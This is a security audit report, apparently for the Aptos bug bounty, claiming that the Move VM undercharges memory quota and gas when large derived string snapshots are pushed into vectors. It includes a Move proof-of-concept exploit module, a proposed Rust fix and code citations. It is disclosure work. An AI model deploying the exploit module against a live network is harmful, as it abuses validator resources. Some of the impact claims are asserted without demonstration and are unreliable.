# Audit Report

## Title
Gas Undercharging for Large Delayed Field Packing Operations Enables Memory Quota Bypass

## Summary
The `abstract_packed_size` method charges a fixed 8 bytes (`per_u64_packed`) for all `DelayedFieldID` values regardless of their actual width, enabling attackers to pack large derived string snapshots (up to 1027 bytes each) into vectors while only paying for 8 bytes per snapshot. This results in 128x gas undercharging for vector operations and memory quota bypass. [1](#0-0) 

## Finding Description

The vulnerability exists in how `DelayedFieldID` values are charged for abstract packed size. The `DelayedFieldID` struct contains two fields: `unique_index` (u32) and `width` (u32), where `width` represents the exact number of bytes the serialized delayed field will occupy. [2](#0-1) 

When users create derived string snapshots with large input strings (up to 1024 bytes allowed), the width calculation produces values around 1027 bytes: [3](#0-2) [4](#0-3) 

However, when these delayed fields are packed into vectors, the gas charging uses `abstract_packed_size`, which treats ALL delayed fields as 8 bytes: [5](#0-4) 

This abstract size is used for memory quota tracking in vector operations: [6](#0-5) 

**Attack Path:**
1. Attacker creates multiple `DerivedStringSnapshot` values with 1024-byte input strings
2. Each snapshot gets a `DelayedFieldID` with width ≈1027 bytes
3. Attacker packs 100 snapshots into a vector using `vector::push_back` or similar operations
4. Memory quota is charged: 100 × 8 = 800 bytes
5. Actual runtime memory usage: 100 × 1027 = 102,700 bytes
6. **Result: 128x memory quota bypass**

The `DerivedStringSnapshot` has `store` ability, confirming it can be stored in vectors: [7](#0-6) 

Memory quota enforcement is active for feature_version >= 3: [8](#0-7) 

## Impact Explanation

This vulnerability qualifies as **Medium Severity** under the Aptos bug bounty program for the following reasons:

1. **Gas Undercharging**: Users can perform vector operations on large delayed fields while paying 128x less gas than the actual computational cost. This breaks the invariant: *"Resource Limits: All operations must respect gas, storage, and computational limits."*

2. **Memory Quota Bypass**: Attackers can exceed their allocated memory quota by 128x during transaction execution, potentially causing:
   - Validator node memory exhaustion if multiple transactions exploit this
   - Non-deterministic behavior if validators hit different memory limits
   - State inconsistencies requiring manual intervention

3. **Limited Scope**: While serious, the impact is contained to:
   - Runtime memory quota bypass (not persistent storage)
   - Gas undercharging for specific operations (vector packing)
   - Storage fees are still correctly charged based on materialized size

The issue does not directly enable fund theft or consensus violations, placing it in the Medium category ($10,000 max) rather than High or Critical.

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely to occur because:

1. **Zero Prerequisites**: Any user can create derived string snapshots via the public Move API
2. **Simple Exploitation**: Requires only calling `create_derived_string` with large strings and packing into vectors
3. **Economic Incentive**: 128x gas savings provides strong motivation for exploitation
4. **No Detection**: The undercharging is silent - transactions appear valid and succeed
5. **Current Feature**: Aggregator V2 with derived strings is actively deployed on mainnet

The main constraint is the `DERIVED_STRING_INPUT_MAX_LENGTH` limit of 1024 bytes, but this still allows 128x exploitation ratio. [9](#0-8) 

## Recommendation

The `abstract_packed_size` for `DelayedFieldID` should charge based on the actual `width` field rather than assuming a fixed 8 bytes. Modify the `visit_delayed` implementation:

**Current Implementation:** [1](#0-0) 

**Recommended Fix:**
```rust
#[inline]
fn visit_delayed(&mut self, depth: u64, val: DelayedFieldID) -> PartialVMResult<()> {
    self.check_depth(depth)?;
    // Charge based on actual width, not fixed u64 size
    let width_bytes = val.extract_width() as u64;
    self.res = Some(self.params.per_u8_packed * NumArgs::from(width_bytes));
    Ok(())
}
```

This ensures the abstract size accurately reflects the serialized size of the delayed field, properly charging for memory quota and gas based on actual resource usage.

**Alternative Approach**: If the width semantics need special handling for performance reasons, introduce a new gas parameter `per_delayed_field_byte_packed` that can be tuned separately from `per_u8_packed`.

## Proof of Concept

```move
module 0xcafe::delayed_field_exploit {
    use std::vector;
    use std::string;
    use aptos_framework::aggregator_v2;

    /// Demonstrates gas undercharging by packing large derived string snapshots
    public entry fun exploit_gas_undercharge() {
        // Create a vector to hold derived string snapshots
        let snapshots = vector::empty<aggregator_v2::DerivedStringSnapshot>();
        
        // Create a maximum-size string (1024 bytes)
        let large_bytes = vector::empty<u8>();
        let i = 0;
        while (i < 1024) {
            vector::push_back(&mut large_bytes, 65); // 'A' character
            i = i + 1;
        };
        
        // Create 100 derived string snapshots with large width (~1027 bytes each)
        let count = 0;
        while (count < 100) {
            let snapshot = aggregator_v2::create_derived_string(string::utf8(large_bytes));
            vector::push_back(&mut snapshots, snapshot);
            count = count + 1;
        };
        
        // At this point:
        // - Memory quota charged: 100 * 8 = 800 bytes (via abstract_packed_size)
        // - Actual memory usage: 100 * 1027 = 102,700 bytes
        // - Undercharge ratio: 128x
        
        // Clean up (snapshots will be dropped)
        while (!vector::is_empty(&snapshots)) {
            let _ = vector::pop_back(&mut snapshots);
        };
    }
}
```

**Test Execution:**
1. Deploy the module to a test network
2. Call `exploit_gas_undercharge()` 
3. Observe gas charged for vector operations (significantly less than expected)
4. Monitor memory usage to confirm 128x discrepancy between charged quota and actual usage

**Expected Behavior:** Transaction succeeds with minimal gas charge for vector packing operations despite large actual memory footprint.

**Notes**
This vulnerability specifically affects the memory quota tracking and gas charging for vector operations containing delayed fields. While storage fees at commitment time are correctly charged based on materialized size, the runtime execution undercharging creates an exploitable gas bypass. The issue is particularly concerning for feature_version >= 3 where memory quota enforcement is active, as it enables users to exceed quotas by orders of magnitude.

### Citations

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/misc.rs (L54-54)
```rust
        [per_u64_packed: AbstractValueSizePerArg, "per_u64_packed", 8],
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/misc.rs (L745-748)
```rust
            fn visit_delayed(&mut self, depth: u64, _val: DelayedFieldID) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_u64_packed * NumArgs::from(1));
                Ok(())
```

**File:** third_party/move/move-vm/types/src/delayed_values/delayed_field_id.rs (L23-30)
```rust
/// Ephemeral identifier type used by delayed fields (e.g., aggregators, snapshots)
/// during execution.
#[derive(Clone, Copy, Debug, Hash, PartialEq, Eq, PartialOrd, Ord)]
pub struct DelayedFieldID {
    unique_index: u32,
    // Exact number of bytes serialized delayed field will take.
    width: u32,
}
```

**File:** types/src/delayed_fields.rs (L15-20)
```rust
pub fn calculate_width_for_constant_string(byte_len: usize) -> usize {
    // we need to be able to store it both raw, as well as when it is exchanged with u64 DelayedFieldID.
    // so the width needs to be larger of the two options
    (bcs_size_of_byte_array(byte_len) + 1) // 1 is for empty padding serialized length
        .max(*U64_MAX_DIGITS + 2) // largest exchanged u64 DelayedFieldID is u64 max digits, plus 1 for each of the value and padding serialized length
}
```

**File:** aptos-move/framework/src/natives/aggregator_natives/aggregator_v2.rs (L53-54)
```rust
/// If we want to increase this, we need to modify BITS_FOR_SIZE in types/src/delayed_fields.rs.
pub const DERIVED_STRING_INPUT_MAX_LENGTH: usize = 1024;
```

**File:** aptos-move/framework/src/natives/aggregator_natives/aggregator_v2.rs (L504-508)
```rust
    if value_bytes.len() > DERIVED_STRING_INPUT_MAX_LENGTH {
        return Err(SafeNativeError::Abort {
            abort_code: EINPUT_STRING_LENGTH_TOO_LARGE,
        });
    }
```

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L47-62)
```rust
    #[inline]
    fn use_heap_memory(&mut self, amount: AbstractValueSize) -> PartialVMResult<()> {
        if self.feature_version >= 3 {
            match self.remaining_memory_quota.checked_sub(amount) {
                Some(remaining_quota) => {
                    self.remaining_memory_quota = remaining_quota;
                    Ok(())
                },
                None => {
                    self.remaining_memory_quota = 0.into();
                    Err(PartialVMError::new(StatusCode::MEMORY_LIMIT_EXCEEDED))
                },
            }
        } else {
            Ok(())
        }
```

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L608-616)
```rust
    fn charge_vec_push_back(&mut self, val: impl ValueView) -> PartialVMResult<()> {
        self.use_heap_memory(
            self.vm_gas_params()
                .misc
                .abs_val
                .abstract_packed_size(&val)?,
        )?;

        self.base.charge_vec_push_back(val)
```

**File:** aptos-move/framework/aptos-framework/sources/aggregator_v2/aggregator_v2.move (L63-66)
```text
    struct DerivedStringSnapshot has store, drop {
        value: String,
        padding: vector<u8>,
    }
```
